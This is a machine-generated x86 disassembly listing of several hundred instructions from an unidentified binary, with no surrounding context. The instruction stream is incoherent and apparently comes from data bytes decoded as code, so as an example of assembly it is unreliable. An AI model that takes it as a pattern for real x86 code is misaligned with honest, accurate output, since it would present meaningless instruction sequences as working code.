  404641:	and    BYTE PTR [ecx-0x60],ah
  404644:	or     BYTE PTR [ebx],cl
  404646:	or     DWORD PTR [eax],esp
  404648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404649:	or     DWORD PTR [eax],edx
  40464b:	inc    ebp
  40464c:	test   BYTE PTR [eax+0x1ea001],cl
  404652:	xor    cl,dl
  404654:	inc    edx
  404655:	dec    eax
  404656:	lock adc BYTE PTR [eax],cl
  404659:	mov    eax,0x21813600
  40465e:	push   ds
  40465f:	add    BYTE PTR [eax+eax*1],0x20
  404663:	add    al,dl
  404665:	inc    esp
  404666:	dec    edi
  404667:	add    al,0xa
  404669:	add    BYTE PTR [ecx],al
  40466b:	inc    eax
  40466c:	add    dl,BYTE PTR [ebx-0x7ff77f7e]
  404672:	adc    DWORD PTR [esp+eax*1+0x2a],ecx
  404676:	rol    BYTE PTR [eax],cl
  404678:	or     BYTE PTR [edi+eax*1],dl
  40467b:	or     BYTE PTR [eax],al
  40467d:	rol    DWORD PTR [eax+ebp*2],0x28
  404681:	push   es
  404682:	add    BYTE PTR [eax],ah
  404684:	sub    BYTE PTR [edx+0x8002084],al
  40468a:	or     BYTE PTR [eax+edx*1-0x3ddf3f5e],al
  404691:	add    BYTE PTR [eax],al
  404693:	add    al,0x21
  404695:	jno    0x404697
  404697:	add    al,0x8c
  404699:	js     0x404653
  40469b:	adc    al,al
  40469d:	adc    BYTE PTR [ebx-0x60],0x0
  4046a1:	and    al,BYTE PTR [edx+eax*1]
  4046a4:	inc    eax
  4046a5:	cmp    al,0x90
  4046a7:	add    BYTE PTR [eax+edx*8],ch
  4046aa:	inc    edx
  4046ab:	add    cl,BYTE PTR [eax+0x0]
  4046ae:	add    BYTE PTR [eax],al
  4046b0:	mov    BYTE PTR [ecx],al
  4046b2:	add    al,0x9
  4046b4:	and    al,BYTE PTR ds:0x43085260
  4046ba:	add    BYTE PTR [eax],0x0
  4046bd:	test   al,0x60
  4046bf:	jb     0x4046c1
  4046c1:	sbb    BYTE PTR [eax+0x2019100],al
  4046c7:	add    BYTE PTR [ecx],0x9
  4046ca:	add    DWORD PTR [eax+0x82b965],0x22304191
  4046d4:	or     BYTE PTR [esi],al
  4046d6:	sub    DWORD PTR [eax+eiz*1],eax
  4046d9:	add    al,BYTE PTR [edi]
  4046db:	or     BYTE PTR [ecx+0x4],al
  4046de:	adc    BYTE PTR [ebx-0x30],al
  4046e1:	and    BYTE PTR [ecx],al
  4046e3:	add    BYTE PTR [eax+edx*1+0xe],cl
  4046e7:	adc    al,0x0
  4046e9:	or     BYTE PTR [eax],al
  4046eb:	xchg   BYTE PTR [ecx+eax*1-0x80],cl
  4046ef:	add    cl,BYTE PTR [ecx+0x41]
  4046f2:	pusha  
  4046f3:	add    BYTE PTR [eax],dl
  4046f5:	and    al,BYTE PTR [eax+eax*1+0x8815a]
  4046fc:	add    dl,ch
  4046fe:	and    al,0xc0
  404700:	adc    BYTE PTR [edx],al
  404702:	or     BYTE PTR [eax],cl
  404704:	inc    eax
  404705:	nop
  404706:	and    BYTE PTR [eax],al
  404708:	add    al,0x2
  40470a:	adc    al,0x90
  40470c:	add    BYTE PTR [edx],al
  40470e:	add    al,0x4
  404710:	dec    eax
  404711:	add    BYTE PTR [eax],dl
  404713:	xor    ebp,DWORD PTR [edx]
  404715:	add    BYTE PTR [edx+0x11],ah
  404718:	add    DWORD PTR [edx+0x4],ecx
  40471b:	push   es
  40471c:	add    BYTE PTR [eax],al
  40471e:	and    dl,al
  404720:	xchg   esp,eax
  404721:	add    BYTE PTR [edx],al
  404723:	add    BYTE PTR [eax],al
  404725:	nop
  404726:	or     DWORD PTR [eax],eax
  404728:	pop    edx
  404729:	add    al,0x41
  40472b:	or     ch,BYTE PTR [eax-0x20]
  40472e:	adc    DWORD PTR [eax],edx
  404730:	and    DWORD PTR [ebp-0x7fff3ffc],0x0
  404737:	add    BYTE PTR [eax],bl
  404739:	adc    BYTE PTR [eax+0x220100a],al
  40473f:	add    al,BYTE PTR [edx]
  404741:	push   esp
  404742:	push   es
  404743:	nop
  404744:	or     BYTE PTR [eax],ah
  404746:	add    BYTE PTR [eax+0x22],al
  404749:	add    BYTE PTR [edx],0x0
  40474c:	or     BYTE PTR [ecx+eiz*2],al
  40474f:	mov    esi,0x3a042
  404754:	add    DWORD PTR [eax+0xc091],eax
  40475a:	add    al,BYTE PTR [ebx+esi*1-0x62]
  40475e:	add    BYTE PTR [eax],0x2
  404761:	add    BYTE PTR [eax],ch
  404763:	sbb    al,0x0
  404765:	add    DWORD PTR [eax+eax*1-0x40],esi
  404769:	shl    BYTE PTR [ebp-0x78],0x60
  40476d:	add    BYTE PTR [edx],al
  40476f:	inc    ecx
  404770:	add    BYTE PTR [eax],0x41
  404773:	mov    WORD PTR [ecx],es
  404775:	inc    ecx
  404776:	add    al,BYTE PTR ds:0x240060
  40477c:	add    al,0xa3
  40477e:	add    ah,al
  404780:	jns    0x404788
  404782:	inc    ecx
  404783:	add    BYTE PTR [eax+eiz*1],al
  404786:	adc    BYTE PTR [eax],0x82
  404789:	inc    eax
  40478a:	add    BYTE PTR [eax],dh
  40478c:	add    BYTE PTR [edx],al
  40478e:	add    al,0xc0
  404790:	add    BYTE PTR [eax+0x6a8000c5],al
  404796:	and    al,BYTE PTR [eax+0xa]
  404799:	and    BYTE PTR [eax],al
  40479b:	sub    ah,al
  40479d:	adc    BYTE PTR [eax],0x6a
  4047a0:	dec    ecx
  4047a1:	test   al,0x40
  4047a3:	add    BYTE PTR [esi],al
  4047a5:	add    BYTE PTR [edx],cl
  4047a7:	pusha  
  4047a8:	add    BYTE PTR [ecx],al
  4047aa:	add    BYTE PTR [eax],al
  4047ac:	xchg   BYTE PTR [edi+0x6],al
  4047af:	adc    BYTE PTR [eax+0x2000800],al
  4047b5:	add    cl,BYTE PTR [esp+eax*1]
  4047b8:	add    BYTE PTR [eax],al
  4047ba:	xchg   esp,eax
  4047bb:	add    BYTE PTR [eax],dl
  4047bd:	or     al,0x0
  4047bf:	ret    0x20
  4047c2:	add    BYTE PTR [eax],dh
  4047c4:	add    BYTE PTR [edx+0x4a4c0007],al
  4047ca:	sbb    BYTE PTR [ecx+eax*2],al
  4047cd:	add    BYTE PTR [esi+0x19],ah
  4047d0:	add    DWORD PTR [edx],eax
  4047d2:	xor    BYTE PTR [eax],al
  4047d4:	sbb    BYTE PTR [edx],al
  4047d6:	adc    BYTE PTR [eax],al
  4047d8:	adc    BYTE PTR [eax],ah
  4047da:	add    BYTE PTR [ecx],al
  4047dc:	add    BYTE PTR [eax],al
  4047de:	add    al,BYTE PTR [eax]
  4047e0:	ret    0x340
  4047e3:	add    eax,DWORD PTR [ecx]
  4047e5:	add    cl,BYTE PTR [eax+0x41]
  4047e8:	push   ss
  4047e9:	inc    eax
  4047ea:	add    al,0x8
  4047ec:	add    al,BYTE PTR [eax+eax*1]
  4047ef:	add    DWORD PTR [eax],ebp
  4047f1:	test   BYTE PTR [eax],al
  4047f3:	inc    ecx
  4047f4:	add    DWORD PTR [eax],ecx
  4047f6:	sub    al,0x11
  4047f8:	add    BYTE PTR [eax+0x2c004480],dl
  4047fe:	add    BYTE PTR [esp+eax*1],al
  404801:	mov    al,ds:0x10011414
  404806:	add    al,0x80
  404808:	add    al,BYTE PTR [eax]
  40480a:	add    eax,0x4800408
  40480f:	scas   eax,DWORD PTR es:[edi]
  404810:	adc    BYTE PTR [edx],al
  404812:	add    al,0x98
  404815:	add    DWORD PTR [eax],edx
  404817:	add    al,BYTE PTR [eax+0x621084]
  40481d:	add    BYTE PTR [eax],0x50
  404820:	add    BYTE PTR [eax],0x80
  404823:	add    dl,BYTE PTR [eax+0x5c]
  404826:	add    BYTE PTR [eax],al
  404828:	retf   
  404829:	push   ecx
  40482a:	add    BYTE PTR [eax],al
  40482c:	adc    al,BYTE PTR [eax]
  40482e:	inc    edx
  40482f:	add    al,0x2
  404831:	push   es
  404832:	adc    BYTE PTR [eax],0x0
  404835:	add    BYTE PTR [eax],dl
  404837:	add    DWORD PTR [edx],edx
  404839:	nop
  40483a:	dec    eax
  40483b:	add    ah,ah
  40483d:	add    al,0x1
  40483f:	push   0x166701
  404844:	or     BYTE PTR [eax],0x0
  404847:	inc    eax
  404848:	or     al,0x2
  40484a:	add    BYTE PTR [eax],bl
  40484c:	dec    edx
  40484d:	mov    al,ds:0x8222440
  404852:	xchg   ecx,eax
  404853:	sub    BYTE PTR [edx],dl
  404855:	adc    BYTE PTR [edx+0x30],dl
  404858:	add    BYTE PTR [eax],dl
  40485a:	push   es
  40485b:	adc    ch,BYTE PTR [eax+0x20]
  40485e:	add    al,BYTE PTR [eax+eax*4]
  404861:	add    bl,BYTE PTR [ebx]
  404863:	mov    dl,BYTE PTR [ebx]
  404865:	or     DWORD PTR [ecx],eax
  404867:	adc    BYTE PTR [eax],al
  404869:	add    BYTE PTR [eax],0x0
  40486c:	and    BYTE PTR [eax],al
  40486e:	mov    al,ds:0xa9000008
  404873:	add    BYTE PTR [eax+0x2],al
  404876:	add    BYTE PTR [eax],0x10
  404879:	and    BYTE PTR [eax],cl
  40487b:	push   ss
  40487c:	or     BYTE PTR [eax],al
  40487e:	dec    eax
  40487f:	add    BYTE PTR [eax],0x0
  404882:	add    BYTE PTR [ebx-0x80],al
  404885:	les    eax,FWORD PTR [eax]
  404887:	add    BYTE PTR [ebx],al
  404889:	add    BYTE PTR [edx],al
  40488b:	inc    eax
  40488c:	adc    DWORD PTR [ecx],eax
  40488e:	cmp    al,BYTE PTR [eax+0x28081102]
  404894:	add    ah,BYTE PTR [eax+0x3b]
  404897:	and    al,BYTE PTR [edx]
  404899:	inc    eax
  40489a:	add    BYTE PTR [ecx],dh
  40489c:	adc    BYTE PTR [ecx],ah
  40489e:	test   al,0x80
  4048a0:	and    BYTE PTR [eax],dl
  4048a2:	add    BYTE PTR [eax],dh
  4048a4:	inc    esp
  4048a5:	add    al,0x4
  4048a7:	add    BYTE PTR [eax],al
  4048a9:	or     BYTE PTR [ebp+0x30441022],al
  4048af:	adc    al,0x20
  4048b1:	add    BYTE PTR [ebx+eax*1],al
  4048b4:	adc    al,BYTE PTR fs:[ecx+0x0]
  4048b8:	add    al,0x0
  4048ba:	add    BYTE PTR [eax],al
  4048bc:	mov    BYTE PTR [eax-0x6dff7000],dh
  4048c2:	mov    BYTE PTR [eax],dl
  4048c4:	add    BYTE PTR [edx+0x4e],al
  4048c7:	add    BYTE PTR [esp+eax*4],al
  4048ca:	add    BYTE PTR [eax],al
  4048cc:	add    eax,esp
  4048ce:	add    BYTE PTR [eax+0x20],ah
  4048d1:	mov    al,ds:0x4b10102
  4048d6:	or     BYTE PTR fs:[ebx-0x3e],al
  4048da:	xor    al,0x40
  4048dc:	inc    edx
  4048dd:	sbb    ecx,DWORD PTR [esp+eax*2-0x7e]
  4048e1:	or     BYTE PTR [eax+0x44008018],0x41
  4048e8:	add    BYTE PTR [ecx+0x54634800],ah
  4048ee:	add    BYTE PTR [eax],cl
  4048f0:	or     BYTE PTR [eax],al
  4048f2:	adc    BYTE PTR [eax],ah
  4048f4:	test   DWORD PTR [eax],eax
  4048f6:	inc    eax
  4048f7:	add    BYTE PTR [eax],al
  4048f9:	add    DWORD PTR [eax],edx
  4048fb:	push   es
  4048fc:	jb     0x404900
  4048fe:	add    DWORD PTR [eax],ebx
  404900:	inc    ecx
  404901:	add    BYTE PTR [eax],al
  404903:	add    BYTE PTR [eax+0x15c2410],al
  404909:	push   es
  40490a:	dec    eax
  40490b:	mov    BYTE PTR [eax],al
  40490d:	add    cl,BYTE PTR [eax+0x484000]
  404913:	inc    eax
  404914:	and    DWORD PTR [eax],esp
  404916:	add    BYTE PTR [eax+0x10480484],al
  40491c:	push   eax
  40491d:	add    BYTE PTR [eax],0x0
  404920:	add    BYTE PTR [eax],al
  404922:	inc    eax
  404923:	or     DWORD PTR [eax+eax*4],eax
  404926:	rol    BYTE PTR [eax],1
  404928:	adc    eax,DWORD PTR [ecx+0x8]
  40492b:	add    BYTE PTR [eax+0x0],ah
  40492e:	xchg   esp,eax
  40492f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404930:	add    BYTE PTR [edx],cl
  404932:	add    BYTE PTR [eax+eax*1+0x1],al
  404936:	dec    edx
  404937:	mov    cs,WORD PTR [eax]
  404939:	add    BYTE PTR [ecx],cl
  40493b:	add    BYTE PTR [ecx],bl
  40493d:	add    BYTE PTR [eax],al
  40493f:	add    BYTE PTR [eax],al
  404941:	les    eax,FWORD PTR [eax]
  404943:	inc    eax
  404944:	sub    BYTE PTR [eax],al
  404946:	add    al,BYTE PTR [eax+ebp*1]
  404949:	or     BYTE PTR [ecx+0x1],al
  40494c:	sbb    al,0x10
  40494e:	inc    esp
  40494f:	add    BYTE PTR [ecx],al
  404951:	pop    eax
  404952:	ins    BYTE PTR es:[edi],dx
  404953:	adc    BYTE PTR [ecx+0x10],dh
  404956:	push   ss
  404957:	add    BYTE PTR [eax+eax*1+0x0],al
  40495b:	push   0x49810320
  404960:	add    BYTE PTR ds:0x52300000,cl
  404966:	xlat   BYTE PTR ds:[ebx]
  404967:	add    BYTE PTR [ecx],al
  404969:	inc    eax
  40496a:	add    al,0xc9
  40496c:	inc    eax
  40496d:	and    al,BYTE PTR [eax]
  40496f:	or     eax,0x29008c
  404974:	dec    eax
  404975:	inc    edx
  404976:	or     al,BYTE PTR [esi]
  404978:	and    al,BYTE PTR [eax+0x40]
  40497b:	adc    ecx,DWORD PTR [eax]
  40497d:	add    al,0x0
  40497f:	add    ecx,DWORD PTR [ebp+0x200018]
  404985:	and    al,BYTE PTR [ecx]
  404987:	add    BYTE PTR [eax+edx*2],al
  40498a:	add    ah,dl
  40498c:	inc    eax
  40498d:	sub    DWORD PTR [ebx],0xe040049
  404993:	add    BYTE PTR [eax],dl
  404995:	adc    BYTE PTR [eax+0x21005200],al
  40499b:	and    ch,BYTE PTR [eax+edi*1]
  40499e:	and    BYTE PTR [edx+0xea8009],cl
  4049a4:	add    al,0x0
  4049a6:	nop
  4049a7:	add    BYTE PTR ds:0xa0320100,al
  4049ad:	and    BYTE PTR [eax+0x8a],0x49
  4049b4:	add    DWORD PTR [eax+eax*4],eax
  4049b7:	dec    eax
  4049b8:	add    BYTE PTR [eax],0x28
  4049bb:	dec    edx
  4049bc:	inc    ecx
  4049bd:	add    eax,0x42860450
  4049c2:	or     DWORD PTR [ecx],eax
  4049c4:	add    DWORD PTR [edx+eax*1],eax
  4049c7:	add    BYTE PTR [eax],ah
  4049c9:	dec    esp
  4049ca:	adc    dl,BYTE PTR [eax+0x0]
  4049cd:	add    BYTE PTR [edx],al
  4049cf:	or     BYTE PTR [eax+0x28300220],cl
  4049d5:	adc    al,0x21
  4049d7:	adc    cl,BYTE PTR [eax+0x2]
  4049da:	inc    eax
  4049db:	add    BYTE PTR [eax],al
  4049dd:	and    DWORD PTR [eax],eax
  4049df:	sbb    DWORD PTR [eax+0x10062482],esp
  4049e5:	add    BYTE PTR [eax+eax*1],dl
  4049e8:	gs and al,0x21
  4049eb:	mov    es,edx
  4049ed:	add    BYTE PTR [edx+0x0],cl
  4049f0:	and    BYTE PTR [eax+0x40],al
  4049f3:	and    bl,BYTE PTR [eax+0x20]
  4049f6:	or     BYTE PTR [eax],al
  4049f8:	add    DWORD PTR [eax+eax*2],ecx
  4049fb:	or     DWORD PTR [edi+0x18],esi
  4049fe:	add    BYTE PTR [ebx],al
  404a00:	and    DWORD PTR [edx+0x19420512],eax
  404a06:	and    BYTE PTR [edx+0x4fc8780],cl
  404a0c:	add    BYTE PTR [eax],al
  404a0e:	push   es
  404a0f:	add    BYTE PTR [esi+0x2b],dl
  404a12:	add    BYTE PTR [eax],dh
  404a14:	adc    BYTE PTR [eax+0x214e020],dh
  404a1a:	add    al,BYTE PTR [eax]
  404a1c:	and    al,BYTE PTR [eax]
  404a1e:	push   edx
  404a1f:	mov    al,ds:0x28480
  404a24:	add    BYTE PTR [eax],0x8
  404a27:	adc    dl,al
  404a29:	add    BYTE PTR [ecx],al
  404a2b:	add    DWORD PTR [esi+0x30],0x44000
  404a32:	or     BYTE PTR [eax-0x3ffffb2f],dl
  404a38:	and    DWORD PTR [edx+eax*1+0x4],eax
  404a3c:	loopne 0x404aa6
  404a3e:	adc    BYTE PTR [eax],ah
  404a40:	adc    DWORD PTR [eax],0x8004152
  404a46:	cmp    BYTE PTR [eax],al
  404a48:	pushf  
  404a49:	mov    BYTE PTR [ecx+edx*2],al
  404a4c:	pusha  
  404a4d:	inc    ecx
  404a4e:	and    BYTE PTR [eax],al
  404a50:	add    BYTE PTR [eax+0x35],0x40
  404a54:	add    al,BYTE PTR [ecx]
  404a56:	add    DWORD PTR [edx-0x7ff6bbfc],eax
  404a5c:	add    BYTE PTR [eax+0x80024a],cl
  404a62:	add    DWORD PTR [ebx-0x5e],edx
  404a65:	add    dl,al
  404a67:	or     al,BYTE PTR [eax]
  404a69:	inc    eax
  404a6a:	adc    BYTE PTR [ecx+0x30],al
  404a6d:	add    BYTE PTR [eax],al
  404a6f:	add    BYTE PTR [eax+0x12a406c4],al
  404a75:	and    BYTE PTR [eax],ah
  404a77:	or     BYTE PTR [ecx],al
  404a79:	add    DWORD PTR [ecx+0x4],ecx
  404a7c:	add    BYTE PTR [eax],ch
  404a7e:	add    BYTE PTR [eax],al
  404a80:	and    DWORD PTR [ecx],eax
  404a82:	adc    BYTE PTR [ecx-0x7f],cl
  404a85:	or     BYTE PTR [eax+eax*4],al
  404a88:	repnz adc BYTE PTR [eax],al
  404a8b:	add    al,BYTE PTR [ecx+0x43005042]
  404a91:	add    BYTE PTR [ecx],al
  404a93:	inc    eax
  404a94:	inc    ecx
  404a95:	adc    BYTE PTR [eax],0x40
  404a98:	sub    DWORD PTR [eax],edx
  404a9a:	and    DWORD PTR [eax+eax*1],0xa000208
  404aa1:	pusha  
  404aa2:	or     al,0x0
  404aa4:	adc    DWORD PTR [eax+0x0],eax
  404aa7:	add    al,0x9
  404aa9:	add    BYTE PTR [eax],ah
  404aab:	add    bl,BYTE PTR [eax+edx*1]
  404aae:	xchg   BYTE PTR [eax+eiz*1],al
  404ab1:	push   ebp
  404ab2:	adc    al,BYTE PTR [eax]
  404ab4:	add    al,0x0
  404ab6:	dec    esp
  404ab7:	add    BYTE PTR [eax],al
  404ab9:	inc    ecx
  404aba:	or     BYTE PTR [ecx],cl
  404abc:	or     DWORD PTR [eax],edx
  404abe:	push   ecx
  404abf:	and    al,0x0
  404ac1:	and    BYTE PTR [ecx],al
  404ac3:	dec    eax
  404ac4:	xchg   BYTE PTR [esi],dl
  404ac6:	add    al,ah
  404ac8:	add    DWORD PTR [eax],eax
  404aca:	or     DWORD PTR [ebx],eax
  404acc:	add    BYTE PTR [eax-0x32fdfdfd],al
  404ad2:	inc    eax
  404ad3:	hlt    
  404ad4:	or     BYTE PTR [ecx+0x2810],al
  404ada:	inc    eax
  404adb:	adc    eax,DWORD PTR [esp+eax*1]
  404ade:	push   0x4
  404ae0:	xor    BYTE PTR [eax],ah
  404ae2:	add    BYTE PTR [edx+0x48],al
  404ae5:	add    BYTE PTR [ecx],ah
  404ae7:	add    BYTE PTR [eax-0x3377f7c0],ah
  404aed:	add    BYTE PTR [edx],bh
  404aef:	push   edx
  404af0:	and    BYTE PTR [ebp+0xc],al
  404af3:	add    BYTE PTR [eax+0x24002a1],al
  404af9:	retf   0x4000
  404afc:	or     BYTE PTR [ecx-0x7fe9f7e0],al
  404b02:	and    BYTE PTR [eax+0x300012c6],cl
  404b08:	pusha  
  404b09:	rol    BYTE PTR [eax],0xc
  404b0c:	and    BYTE PTR [eax],al
  404b0e:	and    BYTE PTR [eax-0x7fe00000],dl
  404b14:	inc    eax
  404b15:	add    DWORD PTR [eax],edx
  404b17:	inc    ebx
  404b18:	mov    eax,ds:0x98001410
  404b1d:	add    al,0x1
  404b1f:	add    DWORD PTR [eax-0x3b],esp
  404b22:	or     BYTE PTR [eax],al
  404b24:	and    BYTE PTR [ecx+edx*2],ah
  404b27:	mov    al,ds:0x9041012
  404b2c:	or     BYTE PTR [edi],0x90
  404b2f:	add    BYTE PTR [ecx],dl
  404b31:	add    BYTE PTR [eax],bl
  404b33:	leave  
  404b34:	rcl    BYTE PTR [eax+0x62c53180],1
  404b3a:	adc    cl,BYTE PTR [eax]
  404b3c:	or     BYTE PTR [edx+0x30],al
  404b3f:	inc    edx
  404b40:	push   esp
  404b41:	inc    edx
  404b42:	add    BYTE PTR [ecx+0x40],al
  404b45:	add    BYTE PTR [eax-0x3e],cl
  404b48:	sub    BYTE PTR [eax],al
  404b4a:	test   al,0x58
  404b4c:	add    al,0x0
  404b4e:	inc    eax
  404b4f:	add    eax,DWORD PTR [eax]
  404b51:	or     al,0x48
  404b53:	sbb    al,0x1
  404b55:	push   esi
  404b56:	add    BYTE PTR [eax],dl
  404b58:	dec    eax
  404b59:	inc    eax
  404b5a:	push   esi
  404b5b:	inc    eax
  404b5c:	add    al,BYTE PTR [eax]
  404b5e:	add    DWORD PTR [eax],eax
  404b60:	popa   
  404b61:	and    BYTE PTR [eax+0x6],al
  404b64:	retf   0x6648
  404b67:	inc    eax
  404b68:	or     al,0x2
  404b6a:	adc    BYTE PTR [eax],cl
  404b6c:	and    BYTE PTR [eax],0x0
  404b6f:	add    BYTE PTR [edx],ch
  404b71:	and    BYTE PTR [eax],al
  404b73:	(bad)  
  404b75:	add    DWORD PTR [eax-0x7ffdfcfe],ecx
  404b7b:	nop
  404b7c:	add    BYTE PTR [eax+0x20],al
  404b7f:	inc    eax
  404b80:	or     eax,0xa021003
  404b85:	xchg   BYTE PTR [edx+eax*1+0x40901040],al
  404b8c:	addr16 dec edx
  404b8e:	add    BYTE PTR [ecx],ah
  404b90:	add    DWORD PTR [esi],esp
  404b92:	push   cs
  404b93:	mov    al,0x12
  404b95:	and    eax,0x404b5044
  404b9a:	add    al,0x81
  404b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b9d:	xchg   ecx,eax
  404b9e:	add    BYTE PTR [eax],ch
  404ba0:	sbb    eax,0x107042
  404ba5:	or     BYTE PTR [ecx],al
  404ba7:	gs add ah,0x42
  404bab:	add    BYTE PTR [eax],al
  404bad:	adc    al,0x0
  404baf:	adc    BYTE PTR [eax],al
  404bb1:	and    al,0x4
  404bb3:	add    al,0x3
  404bb5:	add    al,0x82
  404bb7:	and    cl,BYTE PTR [eax]
  404bb9:	add    BYTE PTR [eax-0x3f],al
  404bbc:	push   eax
  404bbd:	push   ebp
  404bbe:	add    al,0x24
  404bc0:	enter  0xd0,0x3
  404bc4:	mov    BYTE PTR [eax],al
  404bc6:	and    BYTE PTR [esi+0x0],ah
  404bc9:	pop    esp
  404bca:	inc    edx
  404bcb:	add    eax,0x10000021
  404bd0:	adc    DWORD PTR [eax],0x30704000
  404bd6:	and    al,BYTE PTR [ecx]
  404bd8:	rcl    BYTE PTR [eax],0x0
  404bdb:	add    cl,ch
  404bdd:	add    al,0x0
  404bdf:	add    BYTE PTR [eax],cl
  404be1:	and    al,0x80
  404be3:	inc    edx
  404be4:	and    BYTE PTR [eax],al
  404be6:	add    BYTE PTR [eax],0xb0
  404be9:	add    BYTE PTR [ecx+0x48],al
  404bec:	and    BYTE PTR [edx],al
  404bee:	add    BYTE PTR ds:0x2c020004,dl
  404bf4:	pop    es
  404bf5:	add    al,BYTE PTR [eax]
  404bf7:	add    eax,DWORD PTR [eax]
  404bf9:	adc    BYTE PTR [eax],al
  404bfb:	add    BYTE PTR [ecx],al
  404bfd:	add    BYTE PTR [eax+0x26208588],cl
  404c03:	or     cl,BYTE PTR [eax]
  404c05:	inc    edx
  404c06:	adc    BYTE PTR [eax],al
  404c08:	xchg   ecx,eax
  404c09:	inc    ebx
  404c0a:	mov    BYTE PTR [eax+0x20],al
  404c0d:	add    BYTE PTR [eax],dl
  404c0f:	xchg   edx,eax
  404c10:	add    DWORD PTR [eax],eax
  404c12:	inc    esi
  404c13:	add    BYTE PTR ds:0x20050,cl
  404c19:	xchg   edx,eax
  404c1a:	dec    edx
  404c1b:	inc    ebp
  404c1c:	inc    eax
  404c1d:	adc    BYTE PTR [eax],al
  404c1f:	add    BYTE PTR [eax+0x10],al
  404c22:	ret    0x90
  404c25:	jo     0x404c27
  404c27:	or     DWORD PTR [eax],ecx
  404c29:	rol    BYTE PTR [ecx],0x3
  404c2c:	add    BYTE PTR [edx+0xf4a0725],dh
  404c32:	add    BYTE PTR [ecx+ecx*1+0x14],dl
  404c36:	add    BYTE PTR [eax+0x10],al
  404c39:	ror    DWORD PTR [eax+esi*1+0x180042],1
  404c40:	add    BYTE PTR [eax+0x2],dl
  404c43:	sub    al,0x42
  404c45:	ret    0xc000
  404c48:	mov    DWORD PTR [eax+0x218004],eax
  404c4e:	adc    BYTE PTR [esi+edi*1],0x28
  404c52:	adc    BYTE PTR [edi],dl
  404c54:	inc    esp
  404c55:	mov    al,0x4
  404c57:	add    BYTE PTR [esi],cl
  404c59:	adc    esp,DWORD PTR [ecx+0x2490081]
  404c5f:	or     al,BYTE PTR [eax]
  404c61:	test   BYTE PTR [eax+0x10],al
  404c64:	inc    eax
  404c65:	adc    BYTE PTR [edx],al
  404c67:	push   eax
  404c68:	add    al,BYTE PTR [eax+0x10]
  404c6b:	inc    eax
  404c6c:	add    BYTE PTR [eax],al
  404c6e:	and    DWORD PTR [eax],ecx
  404c70:	add    BYTE PTR [edx],dl
  404c72:	or     BYTE PTR [eax-0x77],al
  404c75:	inc    ebx
  404c76:	add    BYTE PTR [edx+0x2188003],al
  404c7c:	add    BYTE PTR [ebx],0x22
  404c7f:	push   eax
  404c80:	sbb    BYTE PTR [eax],cl
  404c82:	and    al,BYTE PTR [eax]
  404c84:	ror    BYTE PTR [eax],0x20
  404c87:	adc    BYTE PTR [eax],cl
  404c89:	pop    eax
  404c8a:	inc    ecx
  404c8b:	inc    edx
  404c8c:	add    BYTE PTR [eax],dl
  404c8e:	xor    dh,BYTE PTR [ecx+0x804fc1]
  404c94:	and    BYTE PTR [esp+ecx*1],al
  404c97:	adc    BYTE PTR [eax+0x48],0x0
  404c9b:	push   esp
  404c9c:	and    BYTE PTR [eax+eax*1],al
  404c9f:	dec    esp
  404ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ca1:	jbe    0x404cab
  404ca3:	add    BYTE PTR [ecx+0x10],al
  404ca6:	or     BYTE PTR [eax+0x8008083],dh
  404cac:	push   es
  404cad:	or     BYTE PTR [esi],al
  404caf:	or     al,0x0
  404cb1:	add    BYTE PTR [eax],al
  404cb3:	add    eax,0x20084300
  404cb8:	pusha  
  404cb9:	add    al,BYTE PTR [eax]
  404cbb:	push   eax
  404cbc:	pop    es
  404cbd:	inc    eax
  404cbe:	add    BYTE PTR [ebx+0x45088404],al
  404cc4:	push   eax
  404cc5:	sub    DWORD PTR [eax],eax
  404cc7:	bound  eax,QWORD PTR [ecx]
  404cc9:	push   es
  404cca:	or     BYTE PTR [eax+eax*1],bl
  404ccd:	add    DWORD PTR [eax+ebp*4],0x809100b2
  404cd4:	xchg   edx,eax
  404cd5:	or     DWORD PTR [eax],0x31
  404cd8:	add    DWORD PTR [ecx+ecx*1+0x12],ecx
  404cdc:	fs das 
  404cde:	add    al,0x68
  404ce0:	ret    
  404ce1:	cmp    al,0x20
  404ce3:	cmp    eax,DWORD PTR [eax]
  404ce5:	and    dl,BYTE PTR [eax-0x3ffffdfe]
  404ceb:	pop    esi
  404cec:	or     BYTE PTR [eax],ah
  404cee:	add    DWORD PTR [eax],ecx
  404cf0:	add    cl,BYTE PTR [eax+0x4]
  404cf3:	add    BYTE PTR [esi],al
  404cf5:	pusha  
  404cf6:	mov    al,ds:0x884030
  404cfb:	and    eax,0x1042003b
  404d00:	add    BYTE PTR [eax+eax*1],dl
  404d03:	add    BYTE PTR [eax],al
  404d05:	add    eax,eax
  404d07:	and    BYTE PTR [eax],cl
  404d09:	add    BYTE PTR [eax],ah
  404d0b:	and    BYTE PTR [eax],dl
  404d0d:	adc    DWORD PTR [eax+0x28],esp
  404d10:	add    DWORD PTR [eax],eax
  404d12:	add    BYTE PTR [eax+ecx*1],ch
  404d15:	and    BYTE PTR [ecx+0x6003a0],al
  404d1b:	and    BYTE PTR [eax+eax*2],al
  404d1e:	add    BYTE PTR [eax],bh
  404d20:	js     0x404d4b
  404d22:	add    BYTE PTR ds:0xa4801000,al
  404d28:	adc    DWORD PTR [edx],ecx
  404d2a:	test   BYTE PTR [edx+0x4000430],al
  404d30:	dec    eax
  404d31:	add    DWORD PTR [eax+0x4c],ebx
  404d34:	add    BYTE PTR [eax+0x4100048],dh
  404d3a:	push   0xffffff88
  404d3c:	add    BYTE PTR [eax],ah
  404d3e:	add    BYTE PTR [eax],bh
  404d40:	int    0x0
  404d42:	add    DWORD PTR [edx],eax
  404d44:	add    BYTE PTR [eax],al
  404d46:	add    BYTE PTR [eax],bl
  404d48:	push   cs
  404d49:	adc    dl,BYTE PTR [eax+ebx*4+0x0]
  404d4d:	dec    ecx
  404d4e:	or     DWORD PTR [eax],eax
  404d50:	adc    BYTE PTR [eax+edx*4],al
  404d53:	add    al,0x20
  404d55:	jecxz  0x404d9f
  404d57:	add    BYTE PTR [eax+0x0],dl
  404d5a:	or     cl,BYTE PTR [esi+0x0]
  404d5d:	add    BYTE PTR [eax],0x41
  404d60:	inc    ebx
  404d61:	push   cs
  404d62:	add    BYTE PTR [ebx],al
  404d64:	add    BYTE PTR [edx],al
  404d66:	and    BYTE PTR [eax+0xa41200],al
  404d6c:	or     BYTE PTR [edx+0x20],al
  404d6f:	and    BYTE PTR [ecx+0x410818],0xa2
